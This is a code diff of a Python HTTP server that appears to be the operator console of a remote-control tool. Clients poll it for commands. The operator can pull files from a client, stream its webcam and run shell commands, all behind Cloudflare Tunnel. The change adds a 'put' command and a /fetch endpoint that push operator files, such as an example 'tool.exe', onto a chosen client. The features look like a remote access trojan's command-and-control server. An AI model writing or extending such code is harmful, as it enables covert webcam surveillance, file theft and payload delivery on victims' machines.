@@ -5,7 +5,7 @@ and cancel support. Runs on Mac behind Cloudflare Tunnel.
 Usage: python3 server.py
 """
 
-VERSION = "3.0.5"
+VERSION = "3.0.6"
 
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from socketserver import ThreadingMixIn
@@ -28,6 +28,7 @@ result_queue = queue.Queue(maxsize=500)  # (client_id, kind, body)
 camera_frames = {}  # client_id -> latest frame data
 camera_clients = {}  # client_id -> set of http response objects
 streaming_clients = set()  # client_ids currently streaming (not command_running)
+pending_files = {}  # client_id -> (filename, bytes) waiting for client to fetch
 
 
 def get_or_create_client(client_id):
@@ -154,6 +155,24 @@ class Handler(BaseHTTPRequestHandler):
                     client = get_or_create_client(client_id)
                     client["last_checkin"] = time.time()
             self._respond(200, b"pong")
+
+        elif path == "/fetch":
+            # Client fetches a file the operator pushed via 'put'
+            if not client_id:
+                self._respond(400, b"missing id")
+                return
+            with lock:
+                entry = pending_files.pop(client_id, None)
+            if entry:
+                filename, data = entry
+                self.send_response(200)
+                self.send_header("Content-Type", "application/octet-stream")
+                self.send_header("Content-Disposition", f'attachment; filename="{filename}"')
+                self.send_header("Content-Length", str(len(data)))
+                self.end_headers()
+                self.wfile.write(data)
+            else:
+                self._respond(204, b"")  # no file pending
 
         elif path == "/camera":
             # Serve MJPEG stream for camera viewing
@@ -363,7 +382,7 @@ def input_loop():
 
         # --- Built-in commands (always handled, even during interactive sessions) ---
         BUILTINS = {"cancel", "sessions", "status", "help", "exit", "stream", "stopstream"}
-        BUILTIN_PREFIXES = ("use ", "kill ", "remove ", "get ")
+        BUILTIN_PREFIXES = ("use ", "kill ", "remove ", "get ", "put ")
         is_builtin = stripped in BUILTINS or any(stripped.startswith(p) for p in BUILTIN_PREFIXES)
 
         if stripped == "cancel":
@@ -500,7 +519,8 @@ def input_loop():
             print("    Ctrl+\\            Same as cancel (keyboard shortcut)")
             print()
             print("  REMOTE COMMANDS (sent to client):")
-            print("    get <filepath>    Download file from client to ~/Desktop")
+            print("    get <filepath>    Download file from client to ~/Desktop (abs or relative to cwd)")
+            print("    put <filepath>    Upload local file to client's script dir (abs or relative)")
             print("    stream            Start webcam streaming on client")
             print("    stopstream        Stop webcam streaming")
             print("    version           Show client version, host, PID")
@@ -600,6 +620,42 @@ def input_loop():
                 client["pending_command"] = f"get:{filename}"
                 client["command_running"] = True
             print(f"[*] Requesting '{filename}' from {active_client}...")
+            continue
+
+        if stripped.startswith("put "):
+            localpath = cmd.strip()[4:].strip()
+            if not localpath:
+                print("[*] Usage: put <local-filepath>  (e.g. put ~/Desktop/tool.exe or put tool.exe)")
+                continue
+            localpath = os.path.expanduser(localpath)
+            if not os.path.isabs(localpath):
+                localpath = os.path.join(os.getcwd(), localpath)
+            if not os.path.isfile(localpath):
+                print(f"[!] Local file not found: {localpath}")
+                continue
+            with lock:
+                if not active_client:
+                    print("[*] No active client. Use 'use <id>' to select one.")
+                    continue
+                client = clients.get(active_client)
+                if not client:
+                    print(f"[!] Client {active_client} not found.")
+                    continue
+                if client["command_running"]:
+                    print(f"[!] Command already running on {active_client}. Cancel first.")
+                    continue
+                try:
+                    with open(localpath, "rb") as f:
+                        data = f.read()
+                except Exception as e:
+                    print(f"[!] Cannot read file: {e}")
+                    continue
+                filename = os.path.basename(localpath)
+                pending_files[active_client] = (filename, data)
+                client["pending_stdin"] = []
+                client["pending_command"] = f"put:{filename}"
+                client["command_running"] = True
+            print(f"[*] Pushing '{filename}' ({len(data):,} bytes) to {active_client}...")
             continue
 
         # --- Remote command or stdin ---
